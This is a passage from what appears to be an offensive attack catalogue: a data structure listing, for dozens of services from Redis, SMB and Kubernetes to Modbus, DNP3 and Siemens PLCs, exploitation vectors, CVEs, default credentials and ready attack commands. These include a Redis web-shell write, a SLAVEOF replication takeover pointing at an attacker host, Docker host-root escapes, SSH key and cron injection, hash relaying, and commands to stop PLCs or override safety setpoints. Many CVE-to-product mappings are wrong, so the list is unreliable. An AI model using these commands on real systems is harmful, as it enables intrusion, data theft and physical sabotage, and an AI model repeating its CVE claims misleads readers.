            "Web shell — CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php; set payload \"<?php system($_GET['c']);?>\"",
            "CVE-2023-28425 — Redis RCE via MSETNX with Lua < 7.0.10",
            "CVE-2024-31449 — Redis Lua sandbox escape (< 7.2.5)",
            "Data exfiltration — dump all keys: KEYS *; GET keyname",
            "Master-slave RCE — SLAVEOF attacker_ip 6379; full replication takeover",
            "CONFIG GET * — read all config, potentially containing passwords"
        ],
        "severity": "CRITICAL",
        "mitre": "T1213",
        "tools": "redis-cli, redis-rogue-server, redis-rogue-getshell, hydra"
    },
    "FTP": {
        "vectors": [
            "Anonymous FTP enabled — read/write entire filesystem — ftp://host",
            "Weak credentials — brute-force (hydra -l admin -P passwords.txt ftp://host)",
            "CVE-2023-39609 — buffer overflow on ProFTPD < 1.3.8b RCE",
            "CVE-2020-9272 — ProFTPD RCE via mod_sftp (< 1.3.7)",
            "CVE-2021-3618 — vsftpd RCE via risky signals",
            "CVE-2011-0762 — vsftpd 2.3.4 backdoor — smiley face trigger on 21",
            "FTP bounce scan — PORT command to scan internal ports via FTP proxy",
            "Exfiltrate sensitive files if writable — GET /etc/passwd",
            "CVE-2023-28531 — ProFTPD memory leak info disclosure",
            "PUT malicious files — upload webshell, overwrite configs",
            "FTP over SSL/TLS (FTPS) — check for weak certs",
            "Directory listing enabled — full path traversal"
        ],
        "severity": "HIGH",
        "mitre": "T1048",
        "tools": "hydra, nmap --script ftp-*, curl, lftp, Metasploit ftp_login"
    },
    "SMB": {
        "vectors": [
            "CVE-2017-0143 (EternalBlue) — SMBv1 RCE, wormable — MS17-010",
            "CVE-2020-0796 (SMBGhost) — SMBv3 compression RCE (< Windows 10 1909)",
            "CVE-2021-44142 — SMB1 info leak on Linux (Samba < 4.13.17)",
            "CVE-2023-3347 — Samba AD DC RCE via LDAP (< 4.17.12)",
            "CVE-2023-0922 — Samba SMB1 + POSIX RCE on Samba",
            "CVE-2023-42669 — Samba oplock RCE (< 4.18.9)",
            "CVE-2024-24860 — Samba ACL bypass (all versions)",
            "Null session — anonymous access to shares: smbclient -L //host -N",
            "Pass-the-hash over SMB if NTLM hashes obtained — crackmapexec smb host -u admin -H hash",
            "SMB relay — responder + ntlmrelayx to capture + relay hashes",
            "Enumerate users — enum4linux -U host, crackmapexec smb host --users",
            "Extract SAM hashes — impacket-secretsdump host -u admin -p pass",
            "SMB signing disabled — NTLM relay possible",
            "Check writable shares — smbclient //host/share -N; upload backdoor"
        ],
        "severity": "CRITICAL",
        "mitre": "T1021.002",
        "tools": "smbclient, crackmapexec, impacket (secretsdump, psexec, smbexec), enum4linux, Metasploit eternalblue"
    },
    "RDP": {
        "vectors": [
            "BlueKeep (CVE-2019-0708) — pre-auth RCE on unpatched Windows 7/2008 R2",
            "CVE-2020-0609 — RDP WORM on Windows 10 1903/1909",
            "CVE-2024-21319 — RDP RCE via CredSSP (< Windows 11 23H2)",
            "CVE-2019-0887 — RDP Hyper-V RCE on host from guest",
            "Weak credentials — brute-force (crowbar -b rdp -s host/32 -u admin -p pass)",
            "NLA (Network Level Authentication) bypass if disabled",
            "RDP man-in-the-middle if cert validation is lax — Seth, xfreerdp /v:host /cert-ignore",
            "Session hijacking if you have SYSTEM — tscon.exe command",
            "RDP clipboard — copy files from server without triggering EDR",
            "RDP drive redirection — mount local drive on server",
            "RDP padding oracle — CVE-2018-0886 CredSSP (< 2018 April)",
            "CVE-2020-16881 — RDP info disclosure via network level authentication",
            "Gallery Path traversal — CVE-2019-1222 if RDP enable"
        ],
        "severity": "CRITICAL",
        "mitre": "T1021.001",
        "tools": "crowbar, hydra, xfreerdp, rdesktop, bluekeep scanner, Metasploit rdp_scanner, rdpscan"
    },
    "VNC": {
        "vectors": [
            "No auth by default — direct screen access — vncviewer host:5900",
            "Weak auth (8-char challenge-response) — brute-force with crowbar",
            "CVE-2020-2900 — VNC server RCE via buffer overflow on RealVNC",
            "CVE-2023-34320 — VNC heap overflow RCE in TightVNC < 2.8.84",
            "CVE-2023-49701 — TightVNC denial of service + RCE",
            "CVE-2021-3712 — VNC info disclosure via abnormal encoding",
            "Screen capture — keystroke logging passive attack",
            "Mouse/keyboard injection — active control of server",
            "VNC authentication bypass via CVE-2006-2369 (RealVNC 4.1)",
            "VNC replay attack — capture + replay auth challenge-response",
            "RFB protocol version downgrade — force 3.3 weak auth"
        ],
        "severity": "CRITICAL",
        "mitre": "T1021.005",
        "tools": "vncviewer, vncrack, crowbar, hydra, Metasploit vnc_login"
    },
    "ELASTICSEARCH": {
        "vectors": [
            "No auth by default (pre-8.0) — full data access on 9200 — curl http://host:9200/_cat/indices",
            "CVE-2015-1427 — Groovy script RCE (< 1.4.3 / 1.3.8)",
            "CVE-2018-17246 — Kibana LFI path traversal to get shell",
            "CVE-2014-3120 — MVEL injection RCE (< 1.2.0)",
            "CVE-2023-43987 — ES snapshot API RCE",
            "CVE-2021-22144 — ES DoS via infinite streaming",
            "Dump all indices — curl http://host:9200/_all/_search?pretty&size=10000",
            "Snapshot API — backup exfiltration — curl http://host:9200/_snapshot",
            "Cluster configuration — curl http://host:9200/_cluster/health — check version",
            "Elasticsearch head plugin — visual data browser",
            "Mapping + settings exfiltration via _mapping and _settings APIs",
            "CVE-2023-31201 — ES RCE via painless scripting"
        ],
        "severity": "CRITICAL",
        "mitre": "T1213",
        "tools": "elasticsearch.py, es-cli, kibana, curl, elasticdump, Metasploit elasticsearch"
    },
    "KAFKA": {
        "vectors": [
            "No auth by default — produce/consume any topic — kafka-console-producer.sh --bootstrap-server host:9092 --topic test",
            "CVE-2023-45896 — JNDI injection on Kafka Connect API — RCE",
            "CVE-2024-31207 — Kafka RCE via Connect REST API < 3.5.2",
            "CVE-2023-25194 — Kafka Connect JDBC connector RCE",
            "Create topics — kafka-topics.sh --create --bootstrap-server host:9092",
            "Inject malicious payloads — poison consumer log aggregation",
            "Data exfiltration via consumer API — kafka-console-consumer.sh --bootstrap-server host:9092 --topic secrets",
            "Deletion denial of service — kafka-topics.sh --delete --bootstrap-server host:9092",
            "KRaft metadata compromise — impersonate controller node",
            "MirrorMaker RCE — if MirrorMaker 2 exposed"
        ],
        "severity": "HIGH",
        "mitre": "T1213",
        "tools": "kafka-cli, kafkacat, kcat, Metasploit kafka"
    },
    "DOCKER API": {
        "vectors": [
            "No auth on 2375 — run any container as root on host — docker -H tcp://host:2375 ps",
            "Mount host filesystem (/:/host) into container = full host RCE: docker -H tcp://host:2375 run -v /:/host -it alpine chroot /host /bin/sh",
            "CVE-2019-5736 — runC container escape (< 1.0.0-rc9)",
            "CVE-2024-21626 — runC WORKDIR escape (leaked fd) — RCE via docker exec",
            "CVE-2022-24394 — Docker privileged container escape",
            "CVE-2021-41091 — Moby Docker Engine privilege escalation",
            "Launch privileged container — docker -H tcp://host:2375 run --privileged -it ubuntu bash",
            "Exfiltrate all images — docker -H tcp://host:2375 save image > image.tar",
            "Exfiltrate host data via volume mount — mount /, /var/lib/docker, /etc",
            "Create service with hostNetwork — access host network namespace",
            "Exposed Docker Swarm port 2377 — join cluster as worker node",
            "Docker Compose exec — docker-compose exec service bash"
        ],
        "severity": "CRITICAL",
        "mitre": "T1611",
        "tools": "docker CLI, runc, container-escape-kit, CDK, amicontained, deepce"
    },
    "KUBERNETES API": {
        "vectors": [
            "No auth on 6443 — full cluster admin — kubectl --server=https://host:6443 get pods",
            "CVE-2018-1002105 — privilege escalation via API server upgrade (< 1.13.1)",
            "CVE-2020-8554 — MITM via ExternalIPs service",
            "CVE-2021-25741 — symlink exchange host path escape — hostPath RCE",
            "CVE-2023-2727 — Kubernetes API Server auth bypass (< 1.24.14, < 1.25.10)",
            "CVE-2023-3676 — Kubernetes API authentication bypass (< 1.28.1)",
            "CVE-2024-3177 — Kubernetes Node RCE via kubelet bypass",
            "Create pods with hostPath — kubectl apply -f pod.yaml with /:/host mount",
            "Dump all secrets — kubectl get secrets --all-namespaces -o yaml",
            "Crypto mining on cluster via arbitrary pod creation",
            "kubelet vulnerable on 10250 — kubectl --server https://host:10250 run",
            "ServiceAccount token extraction from compromised pod",
            "Attach to existing pod — kubectl exec -it pod -- /bin/bash",
            "Cluster admin from pod via automountServiceAccountToken",
            "Kubernetes Dashboard exposed — 8001, 8443, no auth default"
        ],
        "severity": "CRITICAL",
        "mitre": "T1611",
        "tools": "kubectl, kube-hunter, kube-bench, peirates, kubescape, CDK"
    },
    "MEMCACHED": {
        "vectors": [
            "No auth — read/write any key — echo 'stats items' | nc -w1 host 11211",
            "Amplification DDoS (source port 11211) — 10k-50k amplification factor",
            "CVE-2018-17236 — extstore info leak (< 1.5.17)",
            "CVE-2016-8704/5/6 — integer overflow DoS (< 1.4.33)",
            "CVE-2021-34080 — Memcached CRLF injection",
            "Cache poisoning — inject malicious payload into cached responses",
            "Data exfiltration — dump all cached data — echo 'get allkeys' | nc",
            "Get server stats — echo 'stats' | nc -w1 host 11211",
            "Check for proxy mode — if Memcached in proxy mode, can attack origin"
        ],
        "severity": "HIGH",
        "mitre": "T1498",
        "tools": "nc, memcstat, memcached-tool, Metasploit memcached_extractor"
    },
    "LDAP": {
        "vectors": [
            "Anonymous bind — enumerate users, groups, OUs — ldapsearch -x -h host -b dc=domain,dc=com",
            "CVE-2020-25682/3/4 — OpenLDAP DoS/RCE (< 2.4.57)",
            "CVE-2023-2953 — OpenLDAP RCE via ber_get_int (< 2.6.6)",
            "CVE-2022-29160 — OpenLDAP RCE via SASL (< 2.6.3)",
            "CVE-2017-9287 — OpenLDAP user enumeration",
            "LDAP injection if used in auth backend — admin bypass via LDAP filter",
            "Dump entire directory tree — org chart, service accounts, admin accounts",
            "Extract password hashes from AD — userPassword, unicodePwd",
            "Domain admin escalation via LDAP — if bind DN has write access",
            "CVE-2023-44450 — Microsoft AD LDAP DoS via malformed requests",
            "CVE-2024-26234 — Microsoft AD LDAP RCE via shadow credentials"
        ],
        "severity": "HIGH",
        "mitre": "T1213.002",
        "tools": "ldapsearch, ldapdomaindump, windapsearch, BloodHound, crackmapexec ldap"
    },
    "TELNET": {
        "vectors": [
            "Plaintext — capture credentials (tcpdump, wireshark — everything unencrypted)",
            "Weak credentials — brute-force (hydra -l root -P passwords.txt telnet://host)",
            "CVE-2023-48795 — Terrapin prefix truncation attack (SSH/Telnet protocol)",
            "No encryption — full session hijack via MITM (arpspoof + ettercap)",
            "CVE-2013-4854 — telnetd RCE via environment variable injection (BSD)",
            "CVE-2019-0053 — Juniper telnet privilege escalation",
            "CVE-2021-3716 — Telnet service credentials leak via timing",
            "Session recording — capture all keystrokes sent over telnet"
        ],
        "severity": "HIGH",
        "mitre": "T1021.004",
        "tools": "hydra, nc, medusa, telnet, tcpdump"
    },
    "SMTP": {
        "vectors": [
            "Open relay — send spoofed email, phish internal users — swaks --to target@target.com --from ceo@target.com --server host",
            "User enumeration via VRFY — VRFY admin, EXPN root",
            "User enumeration via RCPT TO — RCPT TO:<admin@target.com> (515 response = valid)",
            "CVE-2021-29447 — Postfix RCE via malformed attachment (< 3.5.13, 3.6.5)",
            "CVE-2023-51764 — Postfix SMTP smuggling (< 3.8.4)",
            "CVE-2022-45935 — Postfix RCE via Berkeley DB (< 3.7.4)",
            "CVE-2019-3829 — Exim RCE via BDAT command (< 4.91)",
            "CVE-2023-42114 — Exim RCE via SMTP smuggling (< 4.96.1)",
            "CVE-2022-37452 — Exim RCE via DNS (< 4.95)",
            "Email header injection — add BCC to bypass filters",
            "SPF/DMARC/DKIM bypass for spoofing",
            "STARTTLS stripping — downgrade to plaintext SMTP"
        ],
        "severity": "HIGH",
        "mitre": "T1071.003",
        "tools": "swaks, sendemail, smtp-user-enum, Metasploit smtp_enum, nmap --script smtp-*"
    },
    "RabbitMQ": {
        "vectors": [
            "Default guest:guest credentials — http://host:15672 login",
            "CVE-2023-35791 — management UI XSS (< 3.12.1)",
            "CVE-2020-26059 — ClickJacking on management UI (< 3.8.11)",
            "CVE-2023-35787 — RabbitMQ server-side request forgery",
            "Create/delete queues — rabbitmqadmin declare queue name=malicious",
            "Publish/consume messages — data exfiltration via consumer",
            "Dead letter queue — extract failed messages containing secrets",
            "Federation upstream — connect malicious upstream, consume all data",
            "Shovel plugin — move data between queues external attacker control",
            "Management API auth bypass — if HTTP auth disabled on 15672"
        ],
        "severity": "HIGH",
        "mitre": "T1213",
        "tools": "rabbitmqadmin, rabbitmqctl, curl, Metasploit rabbitmq"
    },
    "NFS": {
        "vectors": [
            "No_root_squash — write as root on NFS share — mount -o noac,noatime host:/share /mnt; chown root:root file",
            "Exposed exports — mount without auth — showmount -e host; mount host:/export /mnt",
            "CVE-2024-26888 — Linux NFSd OOB access (< 6.8)",
            "CVE-2023-3090 — Linux NFSd user info leak",
            "CVE-2022-27205 — NetApp NFS RCE",
            "Read/Write any exported file — sensitive data access",
            "SSH key injection via writable home directories — mount host:/home /mnt; cat id_rsa.pub >> /mnt/user/.ssh/authorized_keys",
            "SUID binaries on NFS — if any binary on share has suid, run as root",
            "World-readable files — misconfigured export permissions",
            "NFSv3 vs NFSv4 — v3 lacks auth mechanism, weaker"
        ],
        "severity": "HIGH",
        "mitre": "T1048",
        "tools": "showmount, mount, nfs-utils, nmap --script nfs-*"
    },
    "SOLR": {
        "vectors": [
            "CVE-2019-17566 — Velocity template injection RCE (< 8.4.0)",
            "CVE-2017-12629 — RunExecutableListener RCE (< 7.1.0)",
            "CVE-2021-27905 — Replication handler SSRF (< 8.8.2)",
            "CVE-2023-50292 — Solr RCE via Config API (< 9.4.0)",
            "CVE-2024-23686 — Solr auth bypass RCE via schema designer",
            "No auth by default — full data access + config modification",
            "Core admin — create/delete cores, modify schema",
            "Data import — load data from URL (SSRF) via DataImportHandler",
            "Config API — modify solrconfig.xml, enable runtime liberty",
            "Dump all cores — select * from index"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "solr-cli, curl, Metasploit solr_*"
    },
    "COUCHDB": {
        "vectors": [
            "No auth by default — full data access on 5984 — curl http://host:5984/_all_dbs",
            "CVE-2017-12635/6 — Erlang JSON parser RCE — POST to /_users with crafted JSON",
            "CVE-2020-1954 — code execution via _config API (< 2.3.1)",
            "CVE-2021-3826 — CouchDB RCE via Mango index",
            "CVE-2023-50907 — Apache CouchDB privilege escalation",
            "Dump all databases — curl http://host:5984/db/_all_docs?include_docs=true",
            "Config extraction — GET /_node/nodename/_config",
            "Create admin user — PUT /_node/nodename/_config/admins/myadmin",
            "Replication — trigger replication to attacker CouchDB (data exfiltration)",
            "_users database — extract password hashes"
        ],
        "severity": "CRITICAL",
        "mitre": "T1213",
        "tools": "curl, couchdb-cli, Metasploit couchdb"
    },
    "WebLogic": {
        "vectors": [
            "CVE-2020-14882/3 — auth bypass + RCE via console — GET /console/images/%2e%2e%2fconsole.portal",
            "CVE-2021-2109 — JNDI injection RCE (< 12.2.1.3.0, 12.2.1.4.0)",
            "CVE-2017-10271 — XMLDecoder deserialization RCE — POST /wls-wsat/CoordinatorPortType",
            "CVE-2019-2729 — Web Services RCE via XMLDecoder",
            "CVE-2023-21839 — WebLogic RCE via IIOP/T3 (< 12.2.1.3.0, < 14.1.1.0.0)",
            "CVE-2023-22100 — WebLogic RCE via ADF Faces",
            "Default admin:admin on console/em console",
            "T3 protocol bypass — if blocked, try IIOP, HTTP, HTTPS",
            "WebLogic Server RCE — JNDI injection via log4j (CVE-2021-44228)",
            "Unauthenticated LDAP extraction via CVE-2021-2394"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "Metasploit weblogic_*, weblogicScanner, CVE-2020-14882 exploit, ysoserial"
    },
    "JBoss": {
        "vectors": [
            "CVE-2017-7504 — JMX invoker deserialization RCE — POST /invoker/JMXInvokerServlet",
            "CVE-2017-12149 — HTTP Invoker RCE (< 5.2) — GET /invoker/readonly",
            "CVE-2010-0738 — JMX remote auth bypass",
            "CVE-2016-5393 — JBoss H2 database RCE via H2 console",
            "CVE-2023-49933 — JBoss/WildFly RCE via management interface",
            "Default admin:admin on management console (9990/9991)",
            "JMX console — deploy WAR payload with jboss-cli",
            "DeploymentScanner — drop WAR file in deployment dir = instant RCE",
            "JMXInvokerServlet deserialization — ysoserial CommonsCollections"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "Metasploit jboss_*, jexboss, ysoserial"
    },
    "AJP": {
        "vectors": [
            "CVE-2020-1938 (Ghostcat) — file read/JSP include RCE via AJP connector on 8009",
            "Read WEB-INF/web.xml, application source code",
            "Direct access to AJP — bypass Tomcat auth completely",
            "CVE-2020-9484 — Tomcat session persistence RCE via file upload",
            "AJP secret required — if secret is weak/predictable (or 'secret'/'password')",
            "Tomcat manager — if AJP proxied to manager app, full admin"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "ghostcat.py, curl, Metasploit ghostcat"
    },
    "KIBANA": {
        "vectors": [
            "CVE-2018-17246 — LFI path traversal to get shell — GET /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../etc/passwd",
            "CVE-2019-7610 — code execution via prototype pollution (< 6.6.1)",
            "CVE-2020-7015 — TSVB timing attack info leak",
            "CVE-2023-31414 — Kibana RCE via saved objects < 8.7.1",
            "CVE-2023-31415 — Kibana arbitrary code execution < 8.7.1",
            "Access Elasticsearch through Kibana UI without auth",
            "Dev Tools console — run Elasticsearch queries directly",
            "Saved objects — extract dashboards, visualizations (may contain passwords/API keys)",
            "Kibana maps — SSRF via custom map tiles URL",
            "CVE-2023-25155 — Kibana server-side request forgery < 8.6.2"
        ],
        "severity": "HIGH",
        "mitre": "T1213",
        "tools": "kibana API, curl, Metasploit kibana"
    },
    "INFLUXDB": {
        "vectors": [
            "No auth by default — full data access on 8086 — curl http://host:8086/ping",
            "CVE-2019-20933 — query injection via InfluxQL",
            "CVE-2020-25816 — InfluxDB RCE via authentication bypass",
            "CVE-2022-21221 — cron job privilege escalation (< 2.1.1)",
            "Dump all databases — SHOW DATABASES, SELECT * FROM cpu LIMIT 100",
            "Write malicious time series — inject false monitoring data",
            "Continuous query abuse — CQs that execute malicious queries",
            "Token extraction — if configured with admin token in env"
        ],
        "severity": "HIGH",
        "mitre": "T1213",
        "tools": "influx CLI, curl, Metasploit influxdb"
    },
    "CASSANDRA": {
        "vectors": [
            "No auth by default — CQL access on 9042 — cqlsh host",
            "CVE-2018-11776 — JMX auth bypass + RCE via jolokia (< 3.11.3)",
            "CVE-2021-44531 — Cassandra RCE via unsanitized user input (< 4.0.2)",
            "CVE-2023-44280 — Apache Cassandra privilege escalation",
            "Dump all keyspaces, tables, data — SELECT * FROM system_schema.keyspaces",
            "Insert/delete data — inject/modify data in tables",
            "DSE (DataStax Enterprise) — Spark integration RCE via spark-shell",
            "JMX access on 7199 — if open, full RCE via MBeans"
        ],
        "severity": "HIGH",
        "mitre": "T1213",
        "tools": "cqlsh, nodetool, jmxterm, Metasploit cassandra"
    },
    "WinRM": {
        "vectors": [
            "Default creds — Administrator:password on 5985/5986",
            "CVE-2021-31166 — WinRM HTTP.sys RCE (< Windows 10 21H2)",
            "CVE-2020-1472 (Zerologon) — Netlogon privilege escalation to domain admin",
            "CVE-2021-42287/42278 (noPac) — AD privilege escalation via PAC",
            "Pass-the-hash — evil-winrm -i host -u admin -H hash",
            "Brute-force — crackmapexec winrm host -u users.txt -p pass.txt",
            "WinRM over HTTPS — check for self-signed certs (MITM)",
            "Resource-based constrained delegation abuse",
            "WinRM session — upload + execute payloads",
            "Dump SAM hashes through WinRM via secretsdump"
        ],
        "severity": "CRITICAL",
        "mitre": "T1021.006",
        "tools": "evil-winrm, crackmapexec winrm, Metasploit winrm_*, ruby_smb"
    },
    "Prometheus": {
        "vectors": [
            "No auth — full metric data access on 9090 — curl http://host:9090/api/v1/targets",
            "Data exfiltration — curl http://host:9090/api/v1/query?query={__name__=~\".+\"}]",
            "PromQL injection — craft queries that overload server",
            "Targets — check endpoints being scraped (may reveal internal services)",
            "Alertmanager — if open on 9093, check for webhook receivers (SSRF)",
            "Service discovery — via consulsd, file_sd, kubernetes_sd",
            "Exposed node_exporter on 9100 — read /proc, host info"
        ],
        "severity": "MEDIUM",
        "mitre": "T1213",
        "tools": "curl, prometheus-cli, promtool"
    },
    "Etcd": {
        "vectors": [
            "No auth — full key-value store access via v2/v3 API",
            "curl http://host:2379/v2/keys/?recursive=true — dump all keys",
            "Kubernetes secrets stored in etcd — /registry/secrets/ contains cluster credentials",
            "etcdctl get / --prefix --keys-only — enumerate all paths",
            "Write access — modify cluster state, pod configs, secrets",
            "CVE-2022-41717 — etcd auth bypass via sensitive path traversal",
            "CVE-2019-14863 — etcd auth RCE via REST API",
            "etcd leader election — disrupt cluster quorum (DoS)"
        ],
        "severity": "CRITICAL",
        "mitre": "T1213",
        "tools": "etcdctl, curl, https://github.com/etcd-io/etcd"
    },
    "SNMP": {
        "vectors": [
            "Default community strings — public (RO), private (RW), manager, secret",
            "snmpwalk -v2c -c public host — dump entire MIB tree",
            "Windows — extract users, shares, services, running processes",
            "CVE-2023-48797 — Net-SNMPd RCE via malformed packets (< 5.9.4)",
            "CVE-2021-44730 — Net-SNMP hardcoded credentials (< 5.9.2)",
            "CVE-2022-24806 — Net-SNMP agentx denial of service",
            "CVE-2024-21756 — SNMP RCE via crafted trap message",
            "Write access — change device config, reboot, reset passwords",
            "Cisco SNMP — extract VPN passwords, configs",
            "HP iLO SNMP — extract iLO credentials, management access",
            "Printer SNMP — extract print jobs, network diagrams"
        ],
        "severity": "HIGH",
        "mitre": "T1046",
        "tools": "snmpwalk, snmpget, snmpset, onesixtyone, braa, Metasploit snmp_enum"
    },
    "DNS": {
        "vectors": [
            "DNS zone transfer — dig axfr @host domain.com — full internal DNS map",
            "DNS cache snooping — dig +norecurse +qr @host domain.com",
            "CVE-2023-3544 — Bind 9 RCE via DNSSEC (< 9.16.44)",
            "CVE-2021-25216 — Bind 9 RCE via GSSAPI (< 9.11.36)",
            "CVE-2023-3341 — Bind 9 DoS via stale answer cache",
            "CVE-2021-46174 — Bind 9 use-after-free RCE",
            "DNS amplification DDoS — used as reflector for DDoS attacks",
            "Open resolver — dig @host google.com (returns = open)",
            "Subdomain enumeration via DNS brute-force — dnsrecon, dnsenum",
            "DNS poisoning — if attacker can MITM DNS, redirect traffic",
            "DNS over HTTPS (DoH) — bypass network monitoring",
            "CDNSKEY / CDS — child delegation signer, potential parent-zone takeover"
        ],
        "severity": "MEDIUM",
        "mitre": "T1572",
        "tools": "dig, nslookup, dnsrecon, dnsenum, fierce, sublist3r, amass"
    },
    "MQTT": {
        "vectors": [
            "No auth — subscribe to ALL topics — mosquitto_sub -h host -t '#' -v",
            "CVE-2023-28366 — Mosquitto RCE via broker crash (< 2.0.16)",
            "CVE-2022-35909 — Eclipse Mosquitto auth bypass via wildcard (< 2.0.15)",
            "CVE-2024-35057 — Mosquitto DoS via malformed CONNECT (< 2.0.18)",
            "Inject malicious payloads into MQTT topics",
            "Subscribe to $SYS topics — server statistics, client list",
            "Publish to control topics — turn IoT devices on/off, unlock doors",
            "Retained messages — read previous messages (may contain secrets)"
        ],
        "severity": "HIGH",
        "mitre": "T1071",
        "tools": "mosquitto_sub/pub, mqtt-spy, mqtt-pwn, nmap --script mqtt-*"
    },
    "Modbus": {
        "vectors": [
            "No auth — read/write ALL coils and registers on the PLC",
            "Read coil values — mbtget -w coil -a 1 host 0 100",
            "Write coil — mbtget -w coil -a 1 host 0 1 (start/stop equipment)",
            "CVE-2023-35261 — Modbus TCP stack RCE (< specific vendor builds)",
            "CVE-2020-14440 — modbus_rtu RCE via buffer overflow",
            "Read holding registers — extract sensor data, setpoints",
            "Write holding registers — modify control logic, override safety limits",
            "Function code 8 (diagnostics) — DoS via clear counters, restart",
            "Function code 11 (Get Comm Event Counter) — reset metrics",
            "CRITICAL: Can cause physical damage by overriding safety PLCs"
        ],
        "severity": "CRITICAL",
        "mitre": "T0835",
        "tools": "mbtget, modbus-cli, pymodbus, nmap --script modbus-*, PLC scan"
    },
    "Siemens S7": {
        "vectors": [
            "No auth — connect to Siemens S7-1200/1500 PLC on port 102",
            "CVE-2023-29457 — Siemens S7-1200 CPU RCE via crafted packet",
            "CVE-2021-26601 — Siemens S7-1500 auth bypass (< 2.9.1)",
            "CVE-2022-38773 — Siemens S7-1200 RCE via session takeover",
            "Read DB blocks — extract proprietary PLC logic",
            "Write DB blocks — modify control logic (can cause physical damage)",
            "Stop CPU — s7client -a host -c 0x29 (STOP command)",
            "Start CPU — s7client -a host -c 0x28 (START command)",
            "Upload full PLC program — download original source code",
            "CVE-2023-5761 — Siemens S7 auth bypass via COTP protocol"
        ],
        "severity": "CRITICAL",
        "mitre": "T0842",
        "tools": "s7client, snap7, python-snap7, Metasploit s7_*, nmap --script s7-info"
    },
    "DNP3": {
        "vectors": [
            "No auth — read/write ALL points in the RTU/PLC (DNP3 has NO authentication by default)",
            "CVE-2023-1708 — DNP3 outstation RCE (< specific vendor builds)",
            "CVE-2022-31314 — DNP3 buffer overflow via long object headers",
            "DNP3 secure authentication bypass — CVE-2021-40288",
            "Read all binary/analog/counter inputs — full SCADA visibility",
            "Write control points — open/close breakers, valves, start/stop pumps",
            "Cold restart — reset RTU to factory defaults (DESTRUCTIVE)",
            "Clear all events — wipe audit trail of control actions",
            "Direct operate — immediate control action without select-before-operate",
            "CRITICAL: Can cause power grid disruption, water treatment failure"
        ],
        "severity": "CRITICAL",
        "mitre": "T0839",
        "tools": "dnp3-simulator, opendnp3, pydnp3, Metasploit dnp3_*"
    },
    "BACnet": {
        "vectors": [
            "No auth — BACnet/IP on port 47808 (0xBAC0) — full building management access",
            "CVE-2023-36863 — BACnet stack RCE via malformed packet",
            "CVE-2022-23121 — BACnet device enumeration attack",
            "CVE-2021-42205 — BACnet server DoS via crafted requests",
            "Read all objects — analog-input, analog-output, binary-input, binary-output",
            "Override setpoints — change temperature, pressure, flow (HVAC, fire suppression)",
            "Open/close valves, dampers, start/stop pumps, fans",
            "Unlock doors — if access control system is BACnet-integrated",
            "Who-Is / I-Am — discover all BACnet devices on network",
            "CRITICAL: Can cause building-wide safety system disruption"
        ],
        "severity": "CRITICAL",
        "mitre": "T0841",
        "tools": "bacnet-stack, bacpypes, BACnet Discovery Tool, nmap --script bacnet-*"
    },
    "OPC-UA": {
        "vectors": [
            "No auth — browse address space, read all tags on 4840",
            "CVE-2023-29415 — OPC UA RCE via crafted message (< 1.4.10)",
            "CVE-2022-25309 — OPC UA RCE via Server registration (< 1.4.8)",
            "CVE-2021-34413 — OPC UA server memory leak via crafted payload",
            "Browse server — discover all variables, methods, objects",
            "Read values — extract sensor data, process parameters, formulas",
            "Write values — modify process parameters (quality, safety impact)",
            "Execute methods — call server methods (may include dangerous operations)",
            "Subscribe to data changes — real-time monitoring of all variables",
            "Historical access — read past process data"
        ],
        "severity": "CRITICAL",
        "mitre": "T0851",
        "tools": "opcua-client, freeopcua, python-opcua, UaExpert, nmap --script opcua-info"
    },
    "EtherNet/IP": {
        "vectors": [
            "No auth — CIP protocol on port 44818 — full PLC/controller access",
            "CVE-2023-35944 — Rockwell EtherNet/IP RCE via CIP < specific versions",
            "CVE-2022-30105 — MicroLogix buffer overflow RCE via EtherNet/IP",
            "CVE-2021-22681 — Rockwell Studio 5000 Logix Designer RCE",
            "List identity — who are all the devices on the network",
            "Read/write tags — access controller tags (can modify logic)",
            "Forward open — establish CIP connection for real-time I/O control",
            "Reset device — CIP reset service (destructive)",
            "Upload project — download full PLC program from controller",
            "Download project — upload new logic to controller (can cause physical damage)"
        ],
        "severity": "CRITICAL",
        "mitre": "T0852",
        "tools": "cpppo, pycomm3, nmap --script enip-*, Rockwell tools"
    },
    "Rsync": {
        "vectors": [
            "List modules — rsync host:: — shows available shares",
            "No auth — rsync -av rsync://host/module/ /tmp/dump — download all files",
            "Write access — rsync -av payload/ rsync://host/module/ — upload files",
            "CVE-2020-14387 — rsync RCE via zlib compression (< 3.2.4)",
            "CVE-2023-41990 — rsync path traversal (< 3.2.7)",
            "CVE-2022-29154 — rsync info leak via symlink (< 3.2.5)",
            "SSH key injection — rsync authorized_keys to target's .ssh",
            "Cron job injection — rsync crontab to /etc/cron.d/",
            "Web shell upload — rsync shell.php to /var/www/html/"
        ],
        "severity": "HIGH",
        "mitre": "T1048",
        "tools": "rsync, nmap --script rsync-*"
    },
    "Jenkins": {
        "vectors": [
            "CVE-2024-23897 — Jenkins CLI read-any-file RCE — java -jar jenkins-cli.jar -s http://host:8080 help @/etc/passwd",
            "CVE-2023–46604 — Jenkins RCE via remoting",
            "CVE-2022-45312 — Jenkins auth bypass via API token",
            "CVE-2021-22570 — Jenkins Groovy sandbox escape RCE",
            "CVE-2019-1003005 — Jenkins Script Security sandbox bypass RCE",
            "Script console — Jenkins script console at /script — run Groovy = RCE",
            "Default admin:admin — if not changed",
            "Build with parameters — inject OS commands via parameterized builds",
            "Credentials — Jenkins stores API keys, SSH keys, passwords (extract via /credential-stores)",
            "Jobs — read/write job configs, modify build steps to include malicious commands",
            "Plugins — vulnerable plugin versions can be exploited"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "jenkins-cli, Jenkins-CVE-2024-23897, Metasploit jenkins_*"
    },
    "GitLab": {
        "vectors": [
            "CVE-2021-22205 — GitLab RCE via ExifTool (< 13.10.3, 13.9.6, 13.8.8)",
            "CVE-2023-5009 — GitLab CI/CD pipeline RCE (< 16.2.6)",
            "CVE-2023-3932 — GitLab critical auth bypass (< 16.2.6)",
            "CVE-2022-2185 — GitLab RCE via GitHub import",
            "CVE-2021-22204 — GitLab RCE via DjVu file upload",
            "Default root:5iveL!fe — on new installs",
            "Public projects — search for accidentally exposed API keys, tokens",
